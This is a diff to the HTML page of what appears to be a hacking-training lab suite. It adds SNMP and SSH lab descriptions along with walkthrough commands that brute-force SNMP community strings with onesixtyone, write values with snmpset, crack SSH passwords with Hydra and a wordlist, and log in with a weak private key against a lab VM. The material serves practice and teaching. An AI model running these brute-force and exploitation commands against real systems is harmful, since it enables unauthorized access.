@@ -388,6 +388,38 @@
                 </div>
             </div>
 
+            <!-- SNMP Lab -->
+            <div class="lab-item reverse">
+                <div class="lab-text">
+                    <span class="lab-badge">PORT 8087 / 16161 | NETWORK</span>
+                    <h3>📡 Dadiwoo SNMP Network Management Lab</h3>
+                    <p>SNMP v1, v2c, and v3 network management server for MIB tree walking, community string brute forcing, OID SET exploits, and VACM view restrictions.</p>
+                    <ul>
+                        <li><strong>Tags:</strong> <code>#snmp</code> <code>#network</code> <code>#mib</code> <code>#vacuum</code> <code>#brute-force</code></li>
+                        <li><strong>Domain:</strong> <code>http://snmp.lab:8087</code></li>
+                    </ul>
+                </div>
+                <div class="lab-preview">
+                    <img src="images/manager_dashboard.png" alt="SNMP Network Management Lab">
+                </div>
+            </div>
+
+            <!-- SSH Lab -->
+            <div class="lab-item">
+                <div class="lab-text">
+                    <span class="lab-badge">PORT 8088 / 2222 | NETWORK</span>
+                    <h3>🔑 Dadiwoo SSH Hacking & Defense Lab</h3>
+                    <p>Interactive SSH server (TCP port 2222) for Hydra password cracking, weak RSA private key authentication, restricted shell breakouts, and Fail2Ban auto-blocking.</p>
+                    <ul>
+                        <li><strong>Tags:</strong> <code>#ssh</code> <code>#network</code> <code>#hydra</code> <code>#brute-force</code> <code>#fail2ban</code> <code>#privesc</code></li>
+                        <li><strong>Domain:</strong> <code>http://ssh.lab:8088</code></li>
+                    </ul>
+                </div>
+                <div class="lab-preview">
+                    <img src="images/manager_dashboard.png" alt="SSH Hacking and Defense Lab">
+                </div>
+            </div>
+
         </div>
     </section>
 
@@ -456,6 +488,21 @@ dns && udp.port == 5353
 
                 <h3>E. Bluetooth Exfiltration - Smartphone Lab</h3>
                 <div class="code-block">curl -s http://&lt;UBUNTU_VM_IP&gt;:8085/api/v1/bluetooth/exfiltrate</div>
+
+                <h3>F. SNMP Reconnaissance & Exploitation - SNMP Lab</h3>
+                <div class="code-block">
+onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt &lt;UBUNTU_VM_IP&gt; -p 16161
+snmpwalk -v2c -c public &lt;UBUNTU_VM_IP&gt;:16161 .1.3.6.1.4.1.9999
+snmpset -v2c -c private &lt;UBUNTU_VM_IP&gt;:16161 .1.3.6.1.4.1.9999.1.4 s "FLAG{SNMP_SET_PWNED}"
+                </div>
+
+                <h3>G. SSH Brute Forcing & Key Authentication - SSH Lab</h3>
+                <div class="code-block">
+hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://&lt;UBUNTU_VM_IP&gt;:2222
+chmod 600 id_rsa_user
+ssh -i id_rsa_user user@&lt;UBUNTU_VM_IP&gt; -p 2222
+ssh-audit -p 2222 &lt;UBUNTU_VM_IP&gt;
+                </div>
             </div>
         </div>
     </section>
